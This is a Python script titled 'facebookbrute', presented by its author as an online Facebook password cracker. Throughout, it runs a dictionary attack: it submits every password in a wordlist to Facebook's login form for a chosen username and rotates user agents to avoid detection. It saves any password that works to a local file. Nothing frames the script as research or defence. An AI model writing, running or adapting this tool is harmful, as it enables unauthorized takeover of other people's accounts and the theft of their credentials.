#!/usr/bin/python
##########################
# Title: facebookbrute
# Author: Th3J0k3r
#
##########################

#
# The modules that are needed.
#
import mechanize
import time
import os
import ConfigParser
import urllib2
import socket
from multiprocessing import Process
from pathlib import Path
from bs4 import BeautifulSoup
from lazyme.string import color_print
from random import choice


#
# The banner.
#
def def_banner():

	os.system('clear')
	color_print(" ______             _                 _    ____             _", color='green')       
 	color_print("|  ____|           | |               | |  |  _ \           | |",color='green')  
 	color_print("| |__ __ _  ___ ___| |__   ___   ___ | | _| |_) |_ __ _   _| |_ ___", color='green')
	color_print("|  __/ _` |/ __/ _ | '_ \ / _ \ / _ \| |/ |  _ <| '__| | | | __/ _ \ ", color='green')
 	color_print("| | | (_| | (_|  __| |_) | (_) | (_) |   <| |_) | |  | |_| | ||  __/ ", color='green')
 	color_print("|_|  \__,_|\___\___|_.__/ \___/ \___/|_|\_|____/|_|   \__,_|\__\___| ", color='green')
                                                                     


	color_print("	Online Facebook Password Cracker -> Created By Th3J0k3r", color='green')

#
# Read in the config file.
#
def def_config ():
	
	# Read in the config file
	global configParser
	configParser = ConfigParser.RawConfigParser()	
	configParser.read('config')

	# Read in the username and wordlist from the config file.
	global passwords
	global dic_path
	dic_path = configParser.get('Config','dict')
	username = configParser.get('Config', 'user')

	# The wordlist file does not exist.
	if (Path(dic_path).is_file() == False):
		color_print("\n\n[!] Please define the username and wordlist in the config file", color='red')
		return

	# There is no username and wordlist specified in the config file.
	if username == 'username' and dic_path == 'wordlist':
		color_print("\n\n[!] You need to setup the config file", color='red')
		return

	else:
		#
		# Start the crack
		#
		def_setup()
		def_process(def_login)


#
# Checks to see if the internet is online
#
def internet_on():
    try:
        # connect to the host -- tells us if the host is actually
        # reachable
        socket.create_connection(("www.facebook.com", 80))
        return True
    except OSError:
        pass
    return False
#
# Setup the browser.
#
def def_setup():

	if (internet_on() == True):
			color_print("\n\n[+] Connection to server successfull", color='green')
	else:
			color_print("[!]  Connection to server failed", color='red')
			returns

	# Setup the proxy.
	#proxy = urllib2.ProxyHandler({'http': '127.0.0.1:1234'})
	#opener = urllib2.build_opener(proxy)
	#urllib2.install_opener(opener)

	# Check if we have setup a proxy.
	#isProxy = raw_input("Please setup your proxy on http://127.0.0.1:1234 Type [Y]: ")
	#if isProxy == 'Y' or isProxy == 'y' or isProxy == 'yes' or isProxy == 'Yes':

	#	color_print("[+] Proxy setup on http://127.0.0.1:1234", color='green')

	# Set the socket timeout.
	mechanize._sockettimeout._GLOBAL_DEFAULT_TIMEOUT = 100

	# Setup Mechanize
	global browser
	browser = mechanize.Browser()

	browser.set_handle_robots(False)
	cookies = mechanize.CookieJar()
	browser.set_cookiejar(cookies)
	user_agents = ['Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7','Konqueror/3.0-rc4; (Konqueror/3.0-rc4; i686 Linux;;datecode)','Opera/9.52 (X11; Linux i686; U; en)']
	random_user_agent = choice(user_agents)
	color_print("[+] Using random user agent " + random_user_agent, color='blue')	
	browser.addheaders = [('User-agent', random_user_agent)]
	browser.set_handle_refresh(True)
	browser.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
		
	# Check the config file to see if debugging is turned on.
	isDebugging = configParser.get('Config', 'debug')
	if isDebugging == 'True':
		# Want debugging messages?
		browser.set_debug_http(True)
		browser.set_debug_redirects(True)
		browser.set_debug_responses(True)


	# Open up the facebook page.
	url = 'http://www.facebook.com/login.php'
	browser.open(url)
	browser.select_form(nr = 0)


#
# MultiProcessing to speed up the crack
#
def def_process (f):
	p = Process(target=f)
	p.start()
	p.join()

#
# Attempt to login with multiple passwords
#
def def_login():


	# read in the username from the config file.
	browser.form['email'] = configParser.get('Config', 'user')
	
	with open(dic_path) as fp:
		line = fp.readline()
	   	while line:
	
			if (internet_on() == True):
					color_print("[+] Connection to server successfull", color='green')
			else:
					color_print("[!]  Connection to server failed", color='red')
					break
			# This is the current password in the dictionary 
			# that we attempt to login with
			#
			password = format(line.strip())
			browser.form['pass'] = str(password)

			# Print out the tries
	      		color_print("\n[*] Trying password {}".format(line.strip()), color='yellow')

			# Try to Submit
			try:
 				request = browser.submit()
			except urllib2.URLError, e:
				color_print("[!] Stopped!!! something went wrong? Try resetting your network interface", e, color='red')
			

			# Declare a BeautifulSoup Object.
			soup = BeautifulSoup(request, 'html.parser')


			# Attempt to brute force the password.
			title = soup.title.string
			if title != 'Facebook':

				# We have the wrong? password so change the user agent
				user_agents = ['Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7','Konqueror/3.0-rc4; (Konqueror/3.0-rc4; i686 Linux;;datecode)','Opera/9.52 (X11; Linux i686; U; en)']
				random_user_agent = choice(user_agents)
				color_print("[+] Using random user agent " + random_user_agent, color='blue')				
				browser.addheaders = [('User-agent', random_user_agent)]

				# PASSWORD NOT FOUND, DAMN!!
				action = soup.find('form', id='login_form').get('action')
				color_print(action, color='red')
				print("[!] Wrong password")
				browser.select_form(nr = 0)
	       			line = fp.readline()

				continue	
			else:

				# SUCCESS PASSWORD FOUND, YEY!!
				username = configParser.get('Config', 'user')	

				# Print out the credentials
				color_print("Password Cracked - Username: " + username + " Password: " + password, color='green')

				# Save the credentials to a file located in the passwords directory
				color_print("[!] Saving credentials to passwords/" + username, color='blue')	
				saveCreds = open('passwords/' + username + ".txt", 'w')
				saveCreds.write(username + '\n')
				saveCreds.write(password)
				saveCreds.close()
				break

			browser.select_form(nr = 0)
	       		line = fp.readline()
#
# call the methods.
#
def_banner()
def_config()
